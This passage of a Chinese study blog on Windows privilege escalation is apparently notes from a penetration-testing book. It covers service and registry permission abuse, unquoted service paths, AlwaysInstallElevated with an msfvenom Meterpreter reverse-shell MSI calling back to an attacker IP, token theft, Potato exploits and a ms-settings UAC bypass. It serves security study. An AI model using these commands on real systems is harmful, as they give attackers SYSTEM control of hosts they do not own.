来指定用户对其拥有的权限，常见的权限列表如下：</p><table><thead><tr><th>权限</th><th>说明</th></tr></thead><tbody><tr><td>SERVICE_START</td><td>启动服务的权限</td></tr><tr><td>SERVICE_STOP</td><td>停止服务的权限</td></tr><tr><td>SERVICE_PAUSE_CONTINUE</td><td>暂停&#x2F;继续运行服务的权限</td></tr><tr><td>SERVICE_QUERY_STATUS</td><td>查询服务状态的权限</td></tr><tr><td>SERVICE_QUERY_CONFIG</td><td>查询服务配置的权限</td></tr><tr><td>SERVICE_CHANGE_CONFIG</td><td>更改服务配置的权限</td></tr><tr><td>SERVICE_ALL_ACCESS</td><td>完全控制权限</td></tr></tbody></table><p>如果用户在配置服务时使得低权限用户对高权限下运行的系统服务拥有更改服务配置的权限，我们就可以直接修改系统服务启动时的二进制文件路径。</p><blockquote><p>AccessChk工具可以枚举目标主机上存在权限缺陷的系统服务。AccessChk是微软官方提供的管理工具，常用来枚举或查看系统中指定用户、组对特定资源(包括但不限于文件、文件夹、注册表、全局对象和系统服务等)的访问权限。</p><p>工具地址：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschk">https://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschk</a></p></blockquote><p>低权限用户可以检查“Authenticated Users”组和“INTERACTIVE”组对系统服务的权限。前者为经过身份验证的用户，包含系统中所有使用用户名、密码登录并通过身份验证的账户，但不包括来宾账户；后者为交互式用户组，包含系统中所有直接登录到计算机进行操作的用户。默认情况下，这两个组为计算机本地“Users”组的成员。</p><p>执行下面命令枚举”Authenticated Users”组是否具有更改服务配置的权限</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">accesschk.exe /accepteula -uwcqv &quot;Authenticated Users&quot; *<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">-uwcqv: 这些选项表示 AccessChk 将以详细格式显示对象的安全描述符信息。每个选项的含义如下：<br><br>u: 显示所属用户（Owner）信息。<br>w: 显示子对象的权限。<br>c: 显示所选对象的ACL（访问控制列表）信息。<br>q: 静默模式，只显示结果而不显示头部信息。<br>v: 显示详细信息。<br></code></pre></td></tr></table></figure><p>我在本机没有找到有更改权限的用户</p><p><img src="http://cdn.clown2024.cn/202407151448398.png" alt="image-20240327105943719"></p><p>以书上例子在找到权限的情况下应该如何利用：</p><p><img src="http://cdn.clown2024.cn/202407151448399.png" alt="image-20240327112003498"></p><p>可以看到该组对InsproSvc服务具有更改服务配置的权限，然后执行下面的命令，我们就可以将该服务启动时执行的二进制文件替换为我们上传的攻击载荷</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sc config InsproSvc binpath= &quot;cmd.exe /k C:\Users\Public\reverse_tcp.exe&quot;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">binpath，指定服务的二进制文件路径，注意“=”后必须有一个空格</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448400.png" alt="image-20240327112213382"></p><p>如果当前用户对该服务拥有SERVICE_STOP和SERVICE_START权限，即我们拥有可以重启服务的权限</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sc stop &lt;service name&gt;<br>sc start &lt;service name&gt;<br></code></pre></td></tr></table></figure><h2><span id="服务注册表权限脆弱">服务注册表权限脆弱</span></h2><p>Windows 的注册表中存储了每个系统服务的条目，而注册表使用 ACL 来管理用户对其所拥有的访问权限。如果注册表的 ACL配置错误，使得一个低权限用户对服务的注册表拥有写入权限，此时可以通过修改注册表来更改服务配置。例如修改注册表中的ImagePath键。</p><ol><li><p>执行下面命令枚举”Authenticated Users”是否具有服务注册表写入权限的用户</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">accesschk.exe /accepteula -uvwqk &quot;Authenticated Users&quot; HKLM\SYSTEM\CurrentControlSet\Services<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">-uvwqk: 这些选项表示 AccessChk 将以详细格式显示对象的安全描述符信息。每个选项的含义如下：<br>u: 显示所属用户（Owner）信息。<br>v: 显示所选对象的详细信息。<br>w: 深入显示子项的信息（递归检查）。<br>q: 静默模式，只显示结果而不显示头部信息。<br>k: 同意许可证。<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448401.png" alt="image-20240327214529644"></p></li><li><p>该用户组对RegSvc服务的注册表具有完全控制权限，所以我们可以执行下面命令将注册表中的ImagePath键指向我们上传的攻击载荷</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg add HKLM\SYSTEM\CurrentControlSet\Services\RegSvc /v ImagePath /t REG_EXPAND_SZ /d &quot;cmd.exe /k C:\Users\Public\reverse_tcp.exe&quot; /f<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/v：指定要添加或修改的注册表值的名称。<br>/t：指定注册表值的类型。在这里是REG_EXPAND_SZ，表示该值包含可扩展的字符串。<br>/d：指定要设置的数据值。<br>/f：在执行命令时强制执行，即不进行提示确认操作。<br></code></pre></td></tr></table></figure></li><li><p>执行下面命令检查当前用户对该服务是否有重启权限：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">accesschk.exe /accepteula -ucqv &quot;Authenticated Users&quot; RegSvc<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448402.png" alt="image-20240327215915634"></p><p>然后我们就可以重启服务进行提权</p></li></ol><h2><span id="服务路径权限可控">服务路径权限可控</span></h2><p>如果目标主机上用户存在错误配置或操作，使得一个低权限的用户对此服务调用的二进制文件或其所在目录拥有写入权限，那么可以直接将该文件替换成攻击载荷，并随着服务的启动继承系统权限。</p><ol><li><p>执行下面命令查看InsexeSvc这个服务的二进制文件所在的目录是否有写入权限</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">accesschk.exe /accepteula /quv &quot;C:\Program Files\Insecure Executables\&quot; <br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448403.png" alt="image-20240327221559789"></p></li><li><p>结果中看到”INTERACTIVE”组对该文件夹具有完全控制权限、</p><p>该组包含所有能够登录到系统的成员。此时，测试人员可以将InsexeSvc 服务的二进制文件替换成一个同名的攻击载荷，并随着服务的重启继承系统权限</p></li></ol><h2><span id="未引用的服务路径">未引用的服务路径</span></h2><p>未引用的服务路径(Unquoted Service Path)漏洞曾被称为可信任的服务路径(TrustedService Path)，利用了 Windows 文件路径解析的特性。当服务启动所执行的二进制文件的路径中包含空格且未有效包含在引号中时，就会导致该漏洞。</p><p>造成该漏洞的根本原因在于 Windows 系统中用于创建进程的 CreateProcess 函数。</p><p>如果完整路径中包含空格且未有效包含在引号中，那么对于该路径中的每个空格Windows 会按照从左到右的顺序依次尝试寻找并执行与空格前的名字相匹配的程序。例如,对于路径 C:\Program Files\Sub Dir\Program Name.exe,系统依次寻找并执行以下程序C:\Program.exe，C:Program Files\Sub.exe ，C:\Program Files\Sub Dir\Program.exe，C:\Program Files\Sub Dir\Program Name.exe 。</p><blockquote><p>当系统进行该路径尝试的时候，会以当前服务所拥有的权限进行。所以当对受影响的目录具有写入权限时，可以上传一个特殊命名的攻击载荷到该目录中</p></blockquote><ol><li><p>执行下面命令枚举主机上所有有该漏洞的服务</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic service get DisplayName, PathName, StartMode|findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448404.png" alt="image-20240327223437698"></p><p>可知UnquoteSvc这个服务的路径有空格且没有引号包裹</p></li><li><p>用Accesschk检查该受影响的目录</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">accesschk.exe /accepteula  -quv &quot;Authenticated Users&quot; &quot;C:\Program Files\Unquoted Path\&quot; <br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448405.png" alt="image-20240327224123522"></p><p>这个时候就可以向该目录上传一个Sub.exe的攻击载荷，检查到这里的时候就会以SYSTEM权限执行Sub.exe程序。</p></li></ol><h2><span id="powerup">PowerUp</span></h2><p>powerup就是一个powershell脚本，里面集中了上面所说的所有方法。使用方法可以去看官方文档</p><p>项目地址：<a href="https://github.com/PowerShellMafia/PowerSploit/">https://github.com/PowerShellMafia/PowerSploit/</a></p><p>这里有一篇使用的文章：<a href="https://blog.51cto.com/binghe001/5247921">https://blog.51cto.com/binghe001/5247921</a></p><h1><span id="msi安装策略提权">MSI安装策略提权</span></h1><p>MSI安装策略提权是由于用户在配置MSI安装策略时，启用了**“永远以高特权进行安装”(AlwaysInstallElevated，默认情况下为禁用状态)**，使得任何权限的用户都可以通过 SYSTEM 权限安装MSI程序。此时测试人员可以在目标主机上安装一个预先制作的恶意MSI文件，以获得SYSTEM 权限。</p><blockquote><p>MSI（Microsoft Installer）是一种用于 Windows 操作系统的安装包格式，MSI 安装策略指的是针对 MSI 安装程序的一系列安装和配置规则。以下是一些常见的 MSI 安装策略：</p><ol><li><strong>组策略（Group Policy）</strong>：管理员可以使用组策略来指定计算机或用户级别的 MSI 安装策略，例如允许或禁止特定程序的安装、配置安装包位置等。</li><li><strong>静默安装（Silent Installation）</strong>：通过在命令行中使用特定参数，可以实现无需用户干预的 MSI 静默安装。这种安装方式通常用于批量部署软件。</li><li><strong>卸载策略</strong>：管理员可以指定卸载 MSI 软件的策略，包括是否允许用户卸载软件、是否强制卸载等。</li><li><strong>修补策略（Patch Policy）</strong>：允许管理员为已安装的 MSI 软件应用修补程序，以解决漏洞或增加功能。管理员可以规定哪些修补程序允许应用、如何应用修补程序等。</li><li><strong>升级策略（Upgrade Policy）</strong>：管理员可以定义升级策略来升级已安装的软件版本，以确保网络上的计算机都在运行最新版本。</li><li><strong>限制策略（Restriction Policy）</strong>：可以通过策略限制哪些用户或计算机可以安装某个 MSI 软件，从而控制软件的分发和访问权限。</li></ol><p>MSI实际上是一个数据库，包含安装和卸载软件时需要使用的大量指令和程序数据</p></blockquote><h2><span id="确定系统是否存在漏洞">确定系统是否存在漏洞</span></h2><p>如果用户配置了”永远以高特权进行安装”，会在注册表下面两个位置创建键值1</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated<br>HKET_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated<br></code></pre></td></tr></table></figure><p>可以执行下面的命令进行确认是否开启该特权</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448406.png" alt="image-20240327231001600"></p><h2><span id="创建恶意msi并安装">创建恶意MSI并安装</span></h2><p>确定目标系统存在该漏洞后，使用MetaSploit自动生成MSI</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.147 LPORT=4444 -f msi -o reverse_tcp.msi<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448407.png" alt="image-20240327231406326"></p><p>在现有的 Meterpreter 会话中将创建的MSI文件上传到目标计算机，执行以下命令:</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">msiexec /quiet /qn /i reverse_tcp.msi<br><span class="hljs-meta prompt_"># </span><span class="language-bash">/quiet，在安装期间禁止向用户发送任何消息；/qn，无GUI模式允许；/i，常规安装</span><br></code></pre></td></tr></table></figure><p>最终提权如下：</p><p><img src="http://cdn.clown2024.cn/202407151448408.png" alt="image-20240327231615328"></p><h1><span id="访问令牌操纵">访问令牌操纵</span></h1><p>Windows 操作系统的访问控制模型(Access Control Model)是 Windows 系统安全性的基础构件，由访问令牌(Access Token)和安全描述符(Security Descriptor)两部分组成，二者分别被访问者和被访问者所持有。通过比较访问令牌和安全描述符的内容Windows 可以对访问者是否拥有访问资源对象的能力进行判定。</p><h2><span id="访问令牌">访问令牌</span></h2><p>当用户登录时，如果验证通过就会为用户创建一个访问令牌，包括登录过程返回的SID以及由本地安全策略分配给用户和用户所属安全组的特权列表。代表该用户执行的每个进程都有此访问令牌的副本。</p><p>Windows 中的令牌可以分为主令牌(Primary Token)和模拟令牌(Impersonation Token)。主令牌与进程相关联，是由 Windows内核创建并分配给进程的默认访问令牌。主令牌与进程相关联，是由Windows内核创建并分配给进程的默认访问令牌。<strong>每个进程都有一个主令牌</strong>，描述了与当前进程关联的用户账户的安全上下文。</p><p>当进程与安全对象进行交互的时候，系统将使用主令牌；此外，线程可以模拟客户端账户，模拟是指线程在安全上下文中执行的能力，并且该上下文不同于拥有该线程的进程的上下文。<strong>当线程模拟客户端时，模拟线程将同时具有主访问令牌和模拟令牌。</strong></p><blockquote><p>通过操纵访问令牌，使当前的进程看起来像是其他进程所启动的子进程或者其他用户所启动的进程；使用内置的Windows API从指定的进程中复制访问令牌来用于现有进程或者生成新进程，并以此来绕过访问控制，提升权限，<strong>这个过程叫做令牌窃取。</strong></p></blockquote><p>内置API：</p><table><thead><tr><th>Win32 API</th><th>说明</th></tr></thead><tbody><tr><td>OpenProcess</td><td>根据提供的进程ID获取指定进程的句柄</td></tr><tr><td>OpenProcessToken</td><td>获取与指定进程相关联的访问令牌的句柄</td></tr><tr><td>DuplicateTokenEx</td><td>复制现有的访问令牌以创建一个新的访问令牌，包括创建主令牌或模拟令牌</td></tr><tr><td>ImpersonateLoggedOnUser</td><td>调用线程来模拟登录用户的访问令牌的安全上下文</td></tr><tr><td>CreateProcessWithTokenW</td><td>创建一个新进程及其主线程，新进程在指定令牌的安全上下文中运行</td></tr><tr><td>CreateProcessAsUserA</td><td>创建一个新进程及其主线程，新进程在由指定令牌表示的用户的安全上下文中运行</td></tr></tbody></table><p>这是一个使用api复制令牌的程序示例：</p><figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    DWORD pid = <span class="hljs-number">1234</span>; <span class="hljs-comment">// 替换为目标进程的进程ID</span><br>    HANDLE hProcess = <span class="hljs-built_in">OpenProcess</span>(PROCESS_QUERY_INFORMATION, FALSE, pid);<br><br>    <span class="hljs-keyword">if</span> (hProcess == <span class="hljs-literal">NULL</span>) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;无法打开目标进程，错误码：&quot;</span> &lt;&lt; <span class="hljs-built_in">GetLastError</span>() &lt;&lt; std::endl;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    HANDLE hToken;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">OpenProcessToken</span>(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &amp;hToken)) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;无法获取目标进程的访问令牌，错误码：&quot;</span> &lt;&lt; <span class="hljs-built_in">GetLastError</span>() &lt;&lt; std::endl;<br>        <span class="hljs-built_in">CloseHandle</span>(hProcess);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    HANDLE hTokenDuplicate;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">DuplicateTokenEx</span>(hToken, MAXIMUM_ALLOWED, <span class="hljs-literal">NULL</span>, SecurityImpersonation, TokenImpersonation, &amp;hTokenDuplicate)) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;无法复制访问令牌，错误码：&quot;</span> &lt;&lt; <span class="hljs-built_in">GetLastError</span>() &lt;&lt; std::endl;<br>        <span class="hljs-built_in">CloseHandle</span>(hToken);<br>        <span class="hljs-built_in">CloseHandle</span>(hProcess);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;成功复制访问令牌！&quot;</span> &lt;&lt; std::endl;<br><br>    <span class="hljs-comment">// 这里可以使用复制的令牌进行操作</span><br><br>    <span class="hljs-built_in">CloseHandle</span>(hToken);<br>    <span class="hljs-built_in">CloseHandle</span>(hProcess);<br>    <span class="hljs-built_in">CloseHandle</span>(hTokenDuplicate);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>注意，令牌窃取只能在特权用户上下文中才能完成，因为通过令牌创建进程使用的CreateProcessWithTokenW和 CreateProcessAsUserA 两个 WindowsAPI分别要求用户必须拥有SeImpersonatePrivilege和 SeAssignPrimaryTokenPrivilege&#x2F;SeIncreaseQuotaPrivilege 特权，而拥有这两个特权的用户一般为系统管理员账户、网络服务账户和系统服务账户(如IIS、MSSQL 等)。</p></blockquote><h2><span id="常规令牌窃取操作">常规令牌窃取操作</span></h2><p>常规的令牌窃取操作往往用来将从管理员权限提升至SYSTEM、TrustedInstaller 等更高的系统权限。在实战中，如果本地管理员账户因为某些组策略设置无法获取某些特权，可以通过令牌窃取来假冒 NT AUTHORITY\SYSTEM 的令牌，以获取更高的系统权限。此外，令牌窃取还经常被用于降权或用户切换等操作。</p><p><strong>利用incognito.exe窃取令牌</strong></p><p>工具地址：<a href="https://github.com/milkdevil/incognito2/blob/master/incognito.exe">https://github.com/milkdevil/incognito2/blob/master/incognito.exe</a></p><p>下面命令列举当前主机上的所有令牌：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">incognito.exe list_tokens -u<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448409.png" alt="image-20240328230830862"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">incognito.exe execute -c &quot;NT AUTHORITY\SYSTEM&quot; whoami<br><span class="hljs-meta prompt_"># </span><span class="language-bash">-c 参数后为要窃取的令牌；<span class="hljs-built_in">whoami</span>为窃取令牌后要执行的命令</span><br></code></pre></td></tr></table></figure><p>该命令窃取目标账户的访问令牌并创建进程</p><p><img src="http://cdn.clown2024.cn/202407151448410.png" alt="image-20240328231014201"></p><p>执行下面命令可以直接实现用户的切换。</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">incognito.exe execute -c &quot;NT AUTHORITY\SYSTEM&quot; cmd<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448411.png" alt="image-20240328231224386"></p><p><strong>利用MetaSploit窃取令牌</strong></p><p>如果获取了Meterpreter，就可以进行令牌窃取等系列操作</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">load incognito  # 加载incognito模块<br>list_tokens -u    #列出主机上的所有访问令牌<br>impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;  #窃取NT AUTHORITY\SYSTEM账户的令牌<br>steal_token &lt;PID&gt;     #从指定的进程中窃取令牌<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448412.png" alt="image-20240329103055609"></p><p><strong>利用令牌获取TrustedInstaller权限</strong></p><p>SYSTEM权限为Windows系统中的最高权限，但是即便获取了该权限也不能修改Windows的系统文件。</p><p>例如，C:\Windows\servicing目录即使拥有 SYSTEM权限也无法向该目录写入文件</p><p><img src="http://cdn.clown2024.cn/202407151448413.png" alt="image-20240329141219861"></p><p>我们可以用icacls查看一下该目录的权限：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">icacls &quot;C:\Windows\servicing&quot;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448414.png" alt="image-20240329141552795"></p><p>发现 NT SERVICE\TrustedInstaller 账户对其具有完全控制权限</p><blockquote><p>从 Windows Vista 开始系统内置了一个 TrustedInstaller 安全主体，拥有修改系统文件权限，专用于对系统进行维护、更新等操作。TrustedInstaller 以一个账户组的形式出现即 NT SERVICE\TrustedInstaller。</p></blockquote><p>TrustedInstaller本身也是一个服务，启动该服务是会运行TrustedInstaller.exe程序，该程序的路径为“C:\Windows\servicing\TrustedInstaller.exe”</p><p><img src="http://cdn.clown2024.cn/202407151448415.png" alt="image-20240329143249885"></p><p>其拥有者就是NT SERVICE\TrustedInstaller；所以我们可以窃取该进程的令牌来获得修改系统文件的权限。</p><p>然后我们执行下面命令先启动该服务</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sc start TrustedInstaller<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448416.png" alt="image-20240329143614256"></p><p>然后在meterpreter中利用上面的pid窃取令牌</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">steal_token &lt;PID&gt;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448417.png" alt="image-20240329143700500"></p><h1><span id="potato家族提权">Potato家族提权</span></h1><p>Potato家族是一种常用的提权技术，通过操纵访问令牌将已获取的Windows服务账户权限提升至系统SYSTEM权限。</p><p>Potato 家族是通过滥用前面令牌窃取提到的两个前提特权，将已获取的 NT AUTHORITY\SYSTEM 账户的访问令牌传入CreateProcessWithTokenW或CreateProcessAsUserA函数进行调用，从而在NT AUTHORITY\SYSTEM 账户的上下文创建新进程，以提升至SYSTEM权限。</p><blockquote><p>在实战场景中，若成功拿到了IIS等服务的 WebShell 或者通过 MSSQL 服务的xp_cmdshell 成功执行了系统命令，此时获取的服务账户拥有 SeImpersonatePrivilege 和SeAssignPrimaryTokenPrivilege 特权，就可以通过 Potato 家族提升至 SYSTEM 权限。</p></blockquote><h2><span id="rotten-potato">Rotten Potato</span></h2><p>即”烂土豆”，用于将已获取的服务账户权限提升至SYSTEM权限。</p><p>Rotten Potato 提权的实现机制相当复杂，拦截 NTLM 身份认证请求，并伪造 NT AUTHORITY\SYSTEM 账户的访问令牌，大致可以分为以下三个步骤：</p><ol><li>通过 CoGetInstanceFromIStorage API，将一个COM对象(BITS)加载到本地可控的端口(TCP 6666)，并诱骗 BITS 对象以 NT AUTHORITY\SYSTEM 账户的身份向该端口发起 NTLM 认证</li><li>借助本地RPC 135端口,对BITS对象的认证过程执行中间人攻击(NTLM Relay),同时调用相关 API为 NT AUTHORITY\SYSTEM 账户在本地生成一个访问令牌。</li><li>通过 NT AUTHORITY\SYSTEM 账户的令牌创建新进程，以获取SYSTEM 权限。</li></ol><p>现在假设已经获取IIS服务账户的WebShell，执行whoami &#x2F;priv查询当前的特权</p><p><img src="http://cdn.clown2024.cn/202407151448418.png" alt="image-20240402093845566"></p><p>通过webshell上线MetaSploit，此时加载incognito不能列举出高权限用户的令牌</p><p><img src="http://cdn.clown2024.cn/202407151448419.png" alt="image-20240402093939148"></p><p>接下来向目标主机上传Rotten Potato的利用程序，并通过下面命令在Meterpreter中运行</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">execute -Hc -f rottenpotato.exe<br></code></pre></td></tr></table></figure><p>此时再次执行list_token -u就可以看到 高权限用户的令牌了</p><p><img src="http://cdn.clown2024.cn/202407151448420.png" alt="image-20240402094141557"></p><p>然后就可以用impersonate_token伪造该令牌获取SYSTEM权限</p><p><img src="http://cdn.clown2024.cn/202407151448421.png" alt="image-20240402094236551"></p><h2><span id="juicy-potato">Juicy Potato</span></h2><p>Juicy Potato 与 Rotten Potato 的原理几乎完全相同，只是在后者的基础上做了扩展，以便更灵活利用 Rotten Potato。Juicy Potato 不再像 Rotten Potato 那样依赖于一个现有的Meterpreter,并且可以自定义 COM 对象加载的端口,以及根据系统版本更换可用的 COM对象</p><p>还是以IIS服务演示，假设已经通过MetaSploit 获取了 IIS服务账户的权限。</p><ol><li><p>上传 JuicyPotato 的利用程序，并根据操作系统版本选择一个可用的 COM 对象。在 Rotten Potato 中使用的 COM 对象为 BITS，而 Juicy Potato 为不同 Windows 版本提供了多个可以利用的COM对象。</p><p>对于Windows Server2016，可以选择的对象有COMXblGameSave,其CLSID为{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}</p></li><li><p>执行以下命令，运行 JuicyPotato，将获取 SYSTEM 权限并运行指定的攻击载荷，成功获取到了一个SYSTEM权限的Meterpreter</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">JuicyPotato.exe -t t -p &quot;C:\inetpub\wwwroot\reverse_tcp.exe&quot; -l 6666 -n 135 -c &#123;F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4&#125;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">-t，指定要使用 CreateProcesswithTokenW和CreateProcessAsUserA()中的哪个函数创建进程</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">-p，指定要运行的程序；-l，指定COM对象加载的端口</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">-n，指定本地RPC服务端口，默认为135；-c，指定COM对象的CLSID</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448422.png" alt="image-20240406110723009"></p></li></ol><blockquote><p>注意，以上提权方法仅适用于 Windows 10 version 1809 和 Windows Server 2019 之前版本的系统。在之后的版本中，微软通过检查RPC 绑定字符串中指定的端口来修复了这个问题，修复后的系统无法通过原来的方法实现中间人攻击。</p></blockquote><h2><span id="printspooferpipe-potato">PrintSpoofer（Pipe Potato）</span></h2><p>该提权技术主要利用了打印机组件路径检查中存在的一个Bug，使高权限的服务能连接到测试人员创建的命名管道，以获取高权限账户的令牌来创建新进程。</p><p>上线MetaSploit后，向目标主机上传PipePotato利用程序，在SHELL中直接运行就会获得SYSTEM权限</p><p><img src="http://cdn.clown2024.cn/202407151448423.png" alt="image-20240406112010157"></p><h2><span id="sweet-potato">Sweet Potato</span></h2><p>集成了上面所述的功能，有机会把这些提权方法复现一下。</p><h1><span id="bypass-uac">Bypass UAC</span></h1><p>用户账户控制(User Account Control，UAC)是Windows操作系统采用的一种控制机制，可以阻止自动安装未经授权的应用并防止意外更改系统设置，有助于防止恶意软件损坏计算机。用户账户控制使应用程序和任务始终在非管理员账户的安全上下文中运行，除非管理员专门授予管理员级别的权限。开启用户账户控制后，每个需要使用管理员访问令牌的应用都必须提示征得用户同意。</p><p>UAC限制限制所有用户包括非RID 500的管理员用户使用标准用户登录到他们的计算机，并在标准用户的安全上下文中访问资源和运行应用；非RID 500指的是除了Administrator以外、位于管理员组的其他用户。</p><p>非RID 500用户登录后，系统会为他们创建两个单独的访问令牌：标准用户访问令牌和管理员访问令牌。两个令牌的用户特定信息相同，只是标准用户令牌移除了Windows管理特权和相关SID。当要执行高权限任务时，系统会自动询问是否批准，也就是平时会弹出的是否以管理员权限运行。</p><blockquote><p>Bypass UAC就是使非RID 500用户可以不需要批准直接使用管理员访问令牌。</p></blockquote><h2><span id="uac白名单">UAC白名单</span></h2><p>微软给一些系统程序设置了白名单机制，这些程序执行高权限时不用再询问；如：slui.exe、wusa.exe、taskmgr.exe、msra.exe、eudcedit.exe、eventvwr.exe、CompMgmtLauncher.exe、rundll32.exe、explorer.exe。</p><p>对这些程序进行DLL劫持、DLL注入或者注册表劫持就可以绕过UAC。</p><p>我们可以用微软官方提供的两个工具来寻找白名单程序：Sigcheck和Strings</p><p>白名单程序的特性就是Manifest 数据中 autoElevate 属性的值为 True。</p><p>Sigcheck可以检测程序是否有autoElevate属性，以ComputerDefaults.exe示例：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sigcheck.exe /accepteula -m C:\Windows\System32\ComputerDefaults.exe<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448424.png" alt="image-20240406121105319"></p><p>Strings可以找出所有具有autoElevate属性的程序</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">strings.exe /accepteula -s C:\Windows\System32\*.exe | findstr /i &quot;autoElevate&quot;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448425.png" alt="image-20240406121717543"></p><p>下面用ComputerDefaults.exe来进行分析，并通过该程序绕过UAC</p><ol><li><p>该程序运行后会打开Windows默认应用，而且不会出现UAC弹窗<img src="http://cdn.clown2024.cn/202407151448426.png" alt="image-20240406123213032"></p></li><li><p>使用进程监控器Process Monitor(这也是微软的官方工具)监控该程序进程的所有操作行为(主要是监控注册表和文件的操作)</p><p><img src="http://cdn.clown2024.cn/202407151448427.png" alt="image-20240406145056963"></p><p>可以看到注册表的查询项和过程，我们就是利用修改查询注册表时会执行的可执行文件的路径来进行UAC绕过，书上用的注册表路径我这里没有，就记录一下绕过过程</p></li></ol><p>书上的该程序使会查询注册表的这两个进程</p><p><img src="http://cdn.clown2024.cn/202407151448428.png" alt="image-20240406145719264"></p><p>通常情况下，以“shell\open\command“命名的注册表中存储的可能是可执行文件的路径，所以知道后就可以修改该项的值以修改可执行文件的路径</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg add &quot;HKCU\Software\Classes\ms-settings\shell\open\command&quot; /d &quot;c:\Windows\System32\cmd.exe&quot; /f<br>reg add &quot;HKCU\Software\Classes\ms-settings\shell\open\command&quot; /v DelegateExecute /t REG_SZ /d &quot;c:\Windows\System32\cmd.exe&quot; 